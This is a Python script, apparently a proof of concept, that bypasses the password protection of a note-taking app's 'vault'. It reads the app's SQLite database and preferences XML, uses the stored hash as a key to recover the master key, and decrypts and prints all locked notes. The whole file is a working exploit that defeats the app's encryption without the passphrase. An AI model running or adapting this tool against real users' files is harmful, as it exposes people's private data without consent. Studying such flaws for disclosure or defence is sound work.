from backports.pbkdf2 import pbkdf2_hmac
import base64
from Crypto.Cipher import AES
from Crypto import Random
import xml.etree.ElementTree as ET
import sqlite3, json, string
import argparse
import os.path
parser = argparse.ArgumentParser()
parser.add_argument("db", help="Database file containing the notes")
parser.add_argument("xml", help="Xml preferences file")
parser.add_argument("--vaultonly",help="Only show vault items",action="store_true")

args = parser.parse_args()

print("########## MemorixVault ##########\n\n\n")

if os.path.isfile(args.db) and os.path.isfile(args.xml):
    pass
else:
    print("Check {} and {} are in this folder".format(args.db,args.xml))
    exit()

class MemorixVault:
    def __init__(self,db_path="db.sqlite3",xml_path="preferences.xml"):
        self.db_path = db_path
        self.xml_path = xml_path
    def decrypt(self,encrypted, passphrase): #EQUIVALENT TO JAVA DECRYPT FUNCTION
        aes = AES.new(passphrase, AES.MODE_ECB)
        return aes.decrypt(base64.b64decode(encrypted))


    def crack(self):
        entries = {"clear":[],"vault":[]}
        xml = ET.parse(self.xml_path).getroot() #PARSE XML FOR READING SALT,HASH AND MASTERKEY
        conn = sqlite3.connect(self.db_path) #READ SQLITE DATABASE
        c = conn.cursor()
        for entry in c.execute('SELECT * FROM entry'): #GET ALL ENTRIES FROM DATABASE
            try:
                base64.b64decode(entry[2]) #IF ENTRY CONTENT IS BASE64 ---> THAT MEANS IT'S ENCRYPTED
                entries["vault"].append(entry) #MOVE ENTRY TO VAULT
            except:
                entries["clear"].append(entry) #IF ENTRY IS NOT BASE64 ---> IT IS PUBLIC

        xml_content = {}
        for child in xml:
            xml_content[child.attrib["name"]] = child.text #READ XML
        hash = xml_content["hash"] #GETTING HASH
        masterkey = xml_content["masterkey"] #GETTING ENCRYPTED MASTERKEY
        salt = base64.b64decode(xml_content["salt"]) #GETTING SALT (AND DECODE IT )
        clef = base64.b64decode(hash) #GETTING KEY AND DECODE IT (WITH THIS KEY, WE DON'T NEED ANY PASSWORD), FOR MORE DETAILS, CHECK VERIFY_PASSWORD FUNCTION.
        mdo = self.decrypt(masterkey,clef) #GETTING MDO ( LOOK IN THE DIAGRAM ), BY DECODING XML MASTERKEY WITH THE KEY ( DECODED HASH )
        encrypted_len = len(entries["vault"]) #CALCULATING NUMBER OF ENCRYPTED ENTRIES ( JUST FOR VISUAL )
        mdo = mdo.decode("utf-8").replace("\x0c","").encode("utf-8") #REMOVE MDO GARBAGE
        masterKey = pbkdf2_hmac("sha1", mdo, salt, 1000, 32)  #GETTING DECRYPTED MASTERKEY BY USING MDO

        for entry in entries["vault"]: 
            encryptedTitle = entry[1] #GETTING ENCRYPTED TITLE
            encryptedContent = entry[2] #GETTING ENCRYPTED CONTENT
            decryptedTitle = self.decrypt(encryptedTitle,masterKey).decode().replace("\r","") #DECRYPT TITLE AND REMOVE GARBAGE
            decryptedContent = self.decrypt(encryptedContent,masterKey).decode().replace("\r","") #DECRYPT CONTENT AND REMOVE GARBAGE
            entry = list(entry) #CONVERT TUPLE TO LIST FOR EDIT VALUES
            decryptedContent = ''.join([x for x in decryptedContent if x in string.printable])#REMOVE SOME GARBAGE
            decryptedTitle = ''.join([x for x in decryptedTitle if x in string.printable])#REMOVE SOME GARBAGE
            entry[1] = decryptedTitle #REPLACE ENCRYPTED TITLE BY DECRYPTED TITLE
            entry[2] = decryptedContent #REPLACE ENCRYPTED CONTENT BY DECRYPTED CONTENT

            #And below it is the results display code

            if args.vaultonly == False:
                entries["clear"].append(tuple(entry))
            else:

                decryptedContent = json.loads(decryptedContent)
                print("{} : ".format(decryptedTitle))
                for item in decryptedContent:
                    print(item["text"]+" ---------> "+str("Checked" if item["checked"] else "Not checked"))

        if args.vaultonly == False:
            i = 1
            print("############## CLEAR ####################\n")
            for entry in entries["clear"]:
                if i > (len(entries["clear"]) - encrypted_len):
                    print("\n############## VAULT ####################\n")
                content = json.loads(entry[2])
                print("{} : ".format(entry[1])+"\n")
                for item in content:
                    print("\t"+item["text"]+" ---------> "+str("Checked" if item["checked"] else "Not checked"))
                i += 1




vault = MemorixVault(db_path=args.db,xml_path=args.xml)
vault.crack()
